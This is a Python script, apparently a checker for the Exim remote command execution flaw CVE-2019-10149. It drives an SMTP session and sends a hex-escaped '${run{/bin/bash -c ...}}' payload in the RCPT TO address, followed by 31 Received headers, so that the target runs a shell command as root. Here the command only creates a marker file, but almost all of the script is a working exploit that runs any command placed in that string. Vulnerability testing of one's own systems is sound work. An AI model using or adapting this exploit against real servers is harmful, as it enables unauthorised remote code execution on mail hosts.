#!/usr/bin/env python
"""
This script will quickly test to see if exim is vulnerable to CVE-2019-10149.
It takes hostname and SMTP port.
"""

import socket
import sys

__author__ = "Andrew Huang"
__email__ = "ahuang@lw"


if len(sys.argv) != 3:
    print("Usage: eximrce.py <SERVER> <PORT>")
    sys.exit(0)

server = sys.argv[1]
if socket.gethostbyname(server) == server:
    print('Use server hostname to test')
    sys.exit(0)

port = int(sys.argv[2])

msgPayload = '''Received: 1
Received: 2
Received: 3
Received: 4
Received: 5
Received: 6
Received: 7
Received: 8
Received: 9
Received: 10
Received: 11
Received: 12
Received: 13
Received: 14
Received: 15
Received: 16
Received: 17
Received: 18
Received: 19
Received: 20
Received: 21
Received: 22
Received: 23
Received: 24
Received: 25
Received: 26
Received: 27
Received: 28
Received: 29
Received: 30
Received: 31
'''

try:
    # create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect to server
    print('Connecting to: {}'.format(server))
    s.connect((server, port))
    # receive the welcome banner
    reply = s.recv(1024)
    print(reply)
    # send EHLO
    print('sending EHLO lwtest.com')
    s.send('EHLO lwtest.com' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    # send mail from
    print('sending MAIL FROM')
    s.send('MAIL FROM:<>' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    # send rcpt to
    # attack string
    payload = r'root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22touch\x20\x2froot\x2flweximtest\x22\x20\x26}}@' + server
    print('sending payload')
    s.send('RCPT TO:' + payload + '\r\n')
    reply = s.recv(1024)
    if "250" not in reply:
        print('[ERROR] payload not accepted')
        sys.exit(0)
    print(reply)
    # send data
    print('sending DATA')
    s.send('DATA' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    print('sending message payload')
    s.send(msgPayload + '\r\n')
    s.send('.' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    print('Test completed. Check to see if /root/lweximtest exist on the server.')
    s.close()
except Exception as e:
    print('Cannot connect to {} {}. Error: {}'.format(server, port, e))
